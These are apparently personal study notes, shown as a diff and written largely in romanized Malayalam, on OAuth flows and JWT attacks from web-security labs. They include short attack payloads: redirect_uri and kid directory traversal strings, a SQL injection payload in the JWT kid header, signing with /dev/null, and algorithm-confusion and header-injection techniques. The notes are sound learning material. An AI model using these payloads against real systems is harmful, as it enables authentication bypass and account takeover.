 2) authorisation code flow-> ivide aadyam john enn user interview pro ilek pokum apol avark john inte calender nokanam ennale john inte free time ariyan patum.so john inte request varumbol interview-pro nere john inte google calender ilek ayakum(aa ayakunda link il korach parameters undakum athil onnan `code`.so john google sign in chyanam.apol google oru redirection link tharum.athil code undakum.so ee code nere interview-pro yude server ilek pokum.enit interview-pro server ee kitiya code+john user id+secret eduth nere google ilek ayakum apol google oru access token interview-pro kk kodukum.apol mathraman interview-pro enna site in john inte calender check chyan patuka. ingnane chyumbol interview-pro nn john inte google il avante username,passwd kodukathe thane keran patum
 3) implicit flow->ithum authorisation code flow thane aan.pakshe ivide `code`  undakila pakaram direct aayi token kitum angane entho aan.utubil nokiyal mathi
-4) Crucially, OAuth allows the user to grant this access without exposing their login credentials to the requesting application
-5) authentication um oAuth use chyum.athayath namal oru appil sign up chyumbol namude social account details kanikum like gmail.so namal namude gmail account select chyumbol client application aa gmail inte oAuth service il poi namude details in vendi request ayakum angane namude username , email oke edukum
-6) main page il aan main points oke ullath so ath nokiko
-7) oauth service use chyuna samayath url il `state`  parameter illengil athil CSRF attack nadan patum-lab2
-8) Depending on the grant type, either a code or token is sent via the victim's browser to the `/callback` endpoint specified in the `redirect_uri` parameter of the authorization request.If the OAuth service fails to validate this URI properly, an attacker may be able to construct a CSRF-like attack, tricking the victim's browser into initiating an OAuth flow that will send the code or token to an attacker-controlled `redirect_uri`.
-9) /auth enn aadyam kanunathayirikum oauth service inte starting(ie,oath login flow) request enn thonunu.ath vazhi namuk ithinte starting manasilakam line /auth?client_id=lskdjfl... .ath kazhinjit ee process theerunath /authenticate enna request ilude aan.so athi kzhinjal  GET /  varum athayath namal namude website ilek redirect aayirikunu.means oauth process kazhinjirikunu
-10) redirect_uri parameter il directory tranversal test chyam. ingane test chyumbol aa website il ulla oru real page thane idan sramikuka ie, /../post?postId=1.adayath one folder up ilek pokumbol website inte url mathrame ullu.so ath kondan post path work aakunath.athava rand page up aanengil /../../ enn idanam ok -lab4
-11) With the authorization code grant type, the user's data is requested and sent via secure server-to-server communication, which a third-party attacker is typically not able to manipulate directly
-12) OAuth was not initially designed with authentication in mind; it was intended to be a means of delegating authorizations for specific resources between applications.However, many websites began customizing OAuth for use as an authentication mechanism. To achieve this, they typically requested read access to some basic user data and, if they were granted this access, assumed that the user authenticated themselves on the side of the OAuth provider.
-13) njn paranjirunu auth service start chyuna request athikavum thudangunath /auth/... enna request ilude aayirikum.so ee request ile host il nokiyal kanam auth server inte hosname aayirikum undavuka.so ee hostname copy chyth new tabil paste chyth athinte path il avasanam configuration path koduth nokuka.athayath documentation il nokiyal kanan patum aa particaula oauth service inte endpoint okke angane search chyth namuk chelapol useful info kandethan patum.ivide last lab il `...my.net/.well-known/openid-configuration`   enn koduth nokumbol namuk pala info yum kanan patunund
+4) ==authorisation code grant type il aadyam client application authorisation code in vendi auth service in request ayakum enit auth service authorisation code client application ayachkodukum.ee code client app in kiti kazhiyumbol aan access token vendi veendum client application auth service in oru POST request vazhi request ayakuka.ithinu shehsam nadakuna commiunication server to server aan so attacker in onum chyan patula. pakshe implicit grant type il direct client application aadyam thane access token auth service il ninum kitunu.allathe adyam authorisation code pine access token angnane illa.so authorisation code grant type inekalum easy aan.implicit il user consent permission kodukumbol thane access token kitunu.pakshe authorisation code grant type il user consent kodukumbol authrisation code aan send aakuka allathe access token alla.so ithukodan authorisation token kurach koodi secure aanen parayan karanam==
+5) Crucially, OAuth allows the user to grant this access without exposing their login credentials to the requesting application
+6) authentication um oAuth use chyum.athayath namal oru appil sign up chyumbol namude social account details kanikum like gmail.so namal namude gmail account select chyumbol client application aa gmail inte oAuth service il poi namude details in vendi request ayakum angane namude username , email oke edukum
+7) main page il aan main points oke ullath so ath nokiko
+8) oauth service use chyuna samayath url il `state`  parameter illengil athil CSRF attack nadan patum-lab2
+9) Depending on the grant type, either a code or token is sent via the victim's browser to the `/callback` endpoint specified in the `redirect_uri` parameter of the authorization request.If the OAuth service fails to validate this URI properly, an attacker may be able to construct a CSRF-like attack, tricking the victim's browser into initiating an OAuth flow that will send the code or token to an attacker-controlled `redirect_uri`.
+10) /auth enn aadyam kanunathayirikum oauth service inte starting(ie,oath login flow) request enn thonunu.ath vazhi namuk ithinte starting manasilakam line /auth?client_id=lskdjfl... .ath kazhinjit ee process theerunath /authenticate enna request ilude aan.so athi kzhinjal  GET /  varum athayath namal namude website ilek redirect aayirikunu.means oauth process kazhinjirikunu
+11) redirect_uri parameter il directory tranversal test chyam. ingane test chyumbol aa website il ulla oru real page thane idan sramikuka ie, /../post?postId=1.adayath one folder up ilek pokumbol website inte url mathrame ullu.so ath kondan post path work aakunath.athava rand page up aanengil /../../ enn idanam ok -lab4
+12) With the authorization code grant type, the user's data is requested and sent via secure server-to-server communication, which a third-party attacker is typically not able to manipulate directly
+13) OAuth was not initially designed with authentication in mind; it was intended to be a means of delegating authorizations for specific resources between applications.However, many websites began customizing OAuth for use as an authentication mechanism. To achieve this, they typically requested read access to some basic user data and, if they were granted this access, assumed that the user authenticated themselves on the side of the OAuth provider.
+14) njn paranjirunu auth service start chyuna request athikavum thudangunath /auth/... enna request ilude aayirikum.so ee request ile host il nokiyal kanam auth server inte hosname aayirikum undavuka.so ee hostname copy chyth new tabil paste chyth athinte path il avasanam configuration path koduth nokuka.athayath documentation il nokiyal kanan patum aa particaula oauth service inte endpoint okke angane search chyth namuk chelapol useful info kandethan patum.ivide last lab il `...my.net/.well-known/openid-configuration`   enn koduth nokumbol namuk pala info yum kanan patunund
+15) athkam ella auth request ilum state enna parameter nirbandhamayi use chyum.ee state parameter namude csrf pole aan.ee parameter il unguessable value undakum.so clinet appum auth serviceum future communication nadathumbol authorisation vendi ee parameter use chyum.so athukond thane auth reqeust ukal check chyumbol ee satate paremter use chyunundon noknama.illengil avide oru csrf attack in possibility und
+16) NOTE: auth thudangumbol client application -/auth or /authorisation enna endpoint ilek request ayakum.aa requestin marupadi aayi auth service /callback,/authcode,/token(ee endpoint aadyathe request ile redirect_uri enna parameter il kanan patum so valya kashtapadila) ilek authorisation code or access token ayakum(depending on the grant type) .so ee redirect_uri enaa uri auth service in correct aayi validate chyan kazhinjilengil attacker controll chyuna url ilek token/code service ayachekam so ath check chyanam
+
+==========================================================
+
+### JWT attacks :
+1) jwt usually start chyunath `ey`  enn string il aan. jwt token moon part aayi moon dot itt seperate chyapetitundakum
+2) NOTE: namal chyuna aadyathe labukal ellam symmetrical algorithm use chythitylla labs aanen thonunu karanam.jwt.io il poi jwt paste chyumbol namuk signature part il kanam oru secret key ennath.but pineed ulla lab ukalil nokiyal kanam public key um athupole private keyum kodukanam rand bar kanam.so athinartham athoke assymetrica algorithm aan use chyunathan.ee secret key enn thudare thudare parayunath thane ee private/public key aan ennan ente oru nigamanam
+3) Autherisation: bearer `token`   ennum jwt token undakam.so just cookie header il mathram nokaruth ok
+4) ==assymetric il njan ithrem kalam vijarichath public key vech encrypt chyunu enit private key vech decrypt chyunu enn.ennal angane alla.rand reethiyilum namuk chyam.ie, publick key vechum encryp chyam athupole private key vechum encrypt chyam.so public key vechan encrypt chythathengil private key vech mathrame decypt chyan patu.athupole private key vechan encrypt chythathengil athinte corresponding public key vech mathrame decrypt chyan patu ok==
+5) assymitrical token -> private key vech sign chyum.enit public key vech verify chyum
+	symmetrical token -> oru same key vech thane sign chyum, athe key vech thane verify chyum
+	so oru application RS256 enna assymetric token use chyunengil ath namal change chythit HS256 polulla symmetric token aaki namal thane key koduth exploit chyan patumon nokuka
+3) oru user ine patiyulla ella datayum ee jwt token il undakum like session token
+4) JWT is just for authorisation not for authentication.with authentication what we are doing is we take a username and a password and autheticate it to make sure that username and password is correct.its like logging a user in but authorisation is actually makign sure that the user that sends request to the server is the same user that actually logged in during the authentication process.normally we check authorisation is by using `sesssion`  ie,session token inside cookie header.so ini next time user request send chyumbol server ee session cookie nokum athil user ine info undakum apol server in manasilakum ith ayal thane aan.so authorise chyum
+5) But in JWT, instead of actuallu using the session cookie, it usea a web token which is what jwt stands for to do the authorisation.athayath namal username,passwd oke adich login chyuna samayath server namuk session cookie tharunathin pakaram oru json webtoken tharum.athil namude userdetails undakum ath encode chyum.athupole athinte koode oru secret key um undakum.so namal aa token tamper chythalum secret key server il ullathkond tamper chyumbol token complete aayi marum apol server il ulla secret key umayi match chyila.so error varum
+6) session cookieyum , JWT ude prathyekath enthenal.session cookie namuk tharumbol namude details server store chyunund.but JWT il server il onum store chyapedunila like user details.so session cookie vech namal request ayakumbol server aa session il ulla details lookup chyunund.but jwt il server il onum store chyunila pakaram client(browser) il aan token store chyapedunath.athkond thane server in namude details oro request nadathumbzhum lookup chyanameniila.aake server store chyunath secret key mathraman
+7) header means aa jwt il use chytha algorith,type. payload means athil ulla user details.pine ullath signature aan.athayath ee signature idunath userin kitiya aa token user modify chythitila enn urapp varuthanan.athayath ee signature il header um pine payload undakum.ath randum base 64 aayi encode chythitundakum.athupole secret key um undakum.so matteth randum tamper chyan patiyalum ee secret key attack erinte kayil illengil onum chyan patila
+8) ==oru server il aan nammal namude application upload chyunath.so namal ayakuna requests oke server aan handle chyunath.so server load balancer aayum reverse proxy aayum act chyunu. namude ela karyangalum handle chyunath server aan.namude database adakam ellam store chyunath server il aan ok==
+9) chelapol oru application onnil kooduthal server undakum.oru bank app in athinte main karyangalk oru server undenn vecho athupole mattu chila karyangalk aayi vere server undenn vecho.apol oru user main bank appil login chyth keri enit matte server il ulla enthengilum access chyumbol session cookie aan use chyunathengil main bank app il avante cookie save chythirikunath.so matte server il kerumbol athil avante cookie store chythirikunila so avan pinem login chyendi varunu ok.bu jwt token aanengil athinte aavisham varunila.karanam namude kayil ulla same secret key mathram use chyth aa appinte different server ilek namuk keram.karanam user information client(browser) ilan store chyuka
+10) so kore servers ulla application aanengil jwt use chyunath nallathan.illengil users oro server ilek pokumbolum login chyendivarum
+11) namuk kitiya jwt token il double click chythal inpector tab il athinte base64 decode chythath kanam
+12) chela applications il secret keys verum weak aayirikum.so namuk ath bruteforce chyth kandupidikan patiyekum
+13) oro users inum oro secret key aan kitunath ennan ente ariv.but ivide lab 3 il namude secret key kandupidichit admin enn username matumbol admin aayi marunund.chelapol namuk kitiya secret key mathiyayirikum
+14) If the server uses an extremely weak secret, it may even be possible to brute-force this character-by-character rather than using a wordlist.
+15) The `kid` (key ID) claim is an optional header claim, used to specify the key for validating the signature.The "n" (modulus) parameter **contains the modulus value for the RSA public key**.athayath kid ennath namal eth publick key aan sign chyan use chyunath enn kandethanayi backend il oru identification vendi idunathan.karanam kore keys undakum so server in areela eth key aanen.so ee identfication parameter vazhi server in manasilakan patum inna public key aan use chythirikunathen .n public keyum aanen thonun value aayi varunath areela
+16) The JWT header can contain the Key Id parameter kid. It is often used to retrieve the key from a database or filesystem. ==The application verifies the signature using the key obtained through the kid parameter==. If the parameter is injectable, it can open the way to signature bypass or even attacks such as RCE, SQLi, and LFI.
+17) jkw header injection chyuna samayath server jkw parameter header il support chyanam ennale injection chyan patu
+18) jku enthinan use chyunath ennal chela token il publick key direct aayi vekila athin pakaram ethengilum oru serveril public keys whitelist aayi vechitundakum.so aa server inte path/url jku enna parameter il aan value aayi vekuka.so oru user ee token vech request nadathumbol server ee jku parameter il ulla pathilek pokum enit avide specify chytha public key vech ee token verify chyum
+19) kid parameter il directory traversal chyan patum.so ath test chyth nokuka -> 
+    `"kid": "../../path/to/file"`
+20) database il username,password mathramall pala karyangalum save chyth vechitundakum.so just login page il matharmalla.pala sthalangalilum namal sqli test chyanam.json web token chelapo server databse il aayirikum save chyth vechitundavuka.so namal kid polula parameter il sqli test chyam.like `"kid": "hello' union select 'a2V5' from information_schema.tables; -- "`  ee a2V5 ennath key ne base64 encode chythirikunathan.so thazhe signature part il poi `key`  enn secret key bar il kodukuka.venengil expiration parameter il("exp")  value kootikodukuka.enit kitiya token eduth copy paste chyth test chyth nokuka ok
+21) chela apps il In order to verify the signature, the server uses the `kid` parameter in JWT header to fetch the relevant key from its filesystem.athayath ee kid il ulla value oru file/datase il oke ayirikam.athukondan njan paranjath kid il directory traversa , sql il oke test chyanamen.You could theoretically do this with any file, but one of the simplest methods is to use `/dev/null`, which is present on most Linux systems. As this is an empty file, fetching it returns null. Therefore, signing the token with a Base64-encoded null byte will result in a valid signature
+22) generally speaking "kid" enna parameter signature verify chyan use chyuna parameter aan
+23) symmetric alogorithathil server thane oru specific key vech aadyam token sign cheyum.pineed varuna request ukal ellam ithe same key vech thane server verify chyum
+24) assymetrical algorithathil ivide server oru private key vech ee token sign chyum.enit pineed varuna request ukal ellam ithinte koode ulla public key vechan verify chyuka
+25) confusion algorithm enthenal satharana server oru jwt token nte signature verify chyan aayi use chyuna algorithm allathe mattoru algorithm vech server ine kond force chyth verify chyan nokunathan confusion algorith.ie, Algorithm confusion attacks (also known as key confusion attacks) occur when an attacker is able to force the server to verify the signature of a JSON web token (JWT) using a different algorithm than is intended by the website's developers
+26) server symmetric key aan use chyunathengil oru otta key mathrame undaku.so ath server oru password pole safe aayi keep chyanam
+27) assymetric key use chyumbol oru private key undakum.so ath safe aayi keep chyanam. athupole publick key um undakum.ath safe ayi keep chyarila servers
+28) algorithm confusion attack ennal namal server ine confuse chyikukayan chyunath.athayath matoru algoirithm (like symmetrical) kodukunu.so server athvech signature verify chyunu.ith undakunath jwt libraries il undakuna flows vazhi aan.lab7 inte theroy part nok
+29) As with other public-key encryption systems, RSA key exchange involves the sharing of a public key that is derived from the private key at the time of generation. In this type of encryption system, anybody with access to the private key can infer the public key.athayath rsa yude private key ullavark athinte public key athil ninum thane access chyan patumen thonunu
+30) Due to the complex mathematical system involved, the opposite (deriving the private key from the public key), is impossible. This is why it is safe to share the public key over the internet to establish a secure connection and begin sharing encrypted data.athayath public key il ninum private key lek convert chyan patila.but private key il ninum public key namuk edukan patum
+31) The important thing to remember is that before you can share encrypted data over the internet, it is first necessary to establish a secure connection between the client and the server.
+
+	To do this, a key exchange – called a handshake – must occur so that both parties can agree on the keys that will be used to encrypt the data.
+
+	Currently, there are five different algorithms that clients can use to carry out that key exchange, of which RSA is one. We have included all five algorithms below:
+
+-   **RSA**
+-   **Diffie-Hellman**
+-   **Elliptic Curve Diffie-Hellman**
+-   **Ephemeral Diffie-Hellman**
+-   **Ephemeral Elliptic Curve Diffie-Hellman**
+
+32) The RSA key-pair is the name for the public and private keys used by the RSA algorithm. The public RSA key is the encryption key, whereas the private key (which must be kept secret to ensure that only the intended recipient can read the data) is the decryption key.
+33) TLS handshake oke nadakuna samayath RSA algorithm oke use chyarundenn
+34) enik raju in oru message ayakanamengil ente kayil rajuvinte publick key mathram mathi pakshe raju inte kayil public key um undakum athupole ayacha message encrypted aanalo.so ath decrypt chyan ulla private key um undayirikanam.ith thane aan namude application jwt use chyunath.enik thonunath assymetric algorithm use chyuna samayath namuk secret key use chyenda karyma illan thonunu
+35) A PEM certificate from Auth0 is a text file containing a Base 64 encoded public key certificate. This is a common format for public and private keys, and in the context of Auth0, public signing keys are made available via the `https://YOUR_DOMAIN/pem` endpoint.
+36) 
+### **alg**
+
+ `alg` indicates the type of algorithm used to sign the JWT token. The most commonly used values are _RS256_ and _HS256,_ which stands for _RSA-SHA256_ (asymmetric) and _HMAC-SHA256_ (symmetric), respectively. _RS256 `alg`_  belongs to the _RSA `kty`_  (read the `kty` section below)
+
+### **x5t**
+
+_x5t_ is the _X509_ certificate’s thumbprint. That is the certificate whose private key was used to sign the JWT.
+
+### **kid**
+
+The _`kid`_ id the key id indicating which key was used to sign the JWT token. This field is particularly useful when the public key discovery endpoint supports many keys and we need to know which key was used to sign.
+
+In order to verify the signature of the JWT token, the verifier needs to know the public key of the public /private key pair used to sign the JTW token. Most identity providers expose this information via discovery mechanisms, such as the one below from Microsoft Azure.
+
+### **kty**
+
+If the key type is part of the algorithm family used to sign the JW, RSA and ECare some allowed via `kty`. _RS256_ and _RS512_ are some algorithms (`alg`) that belong to the RSA algorithm family (`kty`)
+
+### **Use**
+
+-   Use the above information — whether the algorithm is used for _**enc**_ encryption or **sig** signing.
+    
+-   **X5t** and **kid** are explained above
+    
+-   **n** is a public key component of the [RSA](https://en.wikipedia.org/wiki/RSA_(cryptosystem)#Operation).
+    
+-   **e** is a public key component of the [RSA](https://en.wikipedia.org/wiki/RSA_(cryptosystem)#Operation).
+    
+-   **x5c** is the x509 certificate chain. 
+    
+-   _Note: If the algorithm `kty` is EC (elliptic Curve), then the public components are x and y._
+
+37) ivide lab-7 il hint tharunund - You can assume that the server stores its public key as an X.509 PEM file. athayath namuk areela eth file aayitan public key store chythirikunathen so namal ath kandethanam.ivide already hint thanitunund athond kozhapamila
+38) X.509 ennath public key certificate inte format aan.**X.509** is a standard format for **public key certificates**, digital documents that securely associate cryptographic key pairs with identities such as websites, individuals, or organizations.Common applications of X.509 certificates include SSL/TLS and HTTPS for authenticated and encrypted web browsing, signed and encrypted email via the S/MIME protocol, code signing, document signing, client authentication, and government-issued electronic ID
+39) signature il ulla secret key ille - JWT tokens are digitally signed (the signature part) using the payload content and a secret key. In order to change the content, the secret key is required to generate the signature again, otherwise, the signature will be invalid.
+40)  **JSON Web Key Set (JWKS)**
+
+One question arises that how we can get the public key. The JSON Web Key Set (JWKS) is a set of keys that contains the public keys used to verify any JSON Web Token (JWT) issued by the authorization. Most authorization servers expose a discovery endpoint, like `https://YOUR_DOMAIN/.well-known/openid-configuration`. You can use this endpoint to configure your application or API to automatically locate the JSON Web key set endpoint (`jwks_uri`), which contains the public key used to sign the JWT .ivide lab il `/jwks.json`  il pokumbol aan namuk public key kituka or `/.well-known/jwks.json`   enna file il poyalum chelapo public key kitumayirikum.jwt endpoint inte wordlist kitumengil angane on try chyth nok
+
+41) ithil parayunath most of the time namuk public key angane evide ninum kitila ennan.so angane varumbol namuk server tharuna normal jwt undalo ath randenam edukanam.ie, oru pravisham login chyuka enit aa kitiya jwt copy chyuka enit log out aayi pine log in aayi kerumbol puthiya jwt kitum ee randenam vech python script use chyth namuk jwt undakna patumon nokam
+42) http request il namal oro header il um test chyunath pole jwt token ile oro parameter ilum namal test chyanam.ie,"email": enna parameter il namal victim inte email koduth nokanam apol entha samvavikuka enn nokanam angane oronum test chyuka
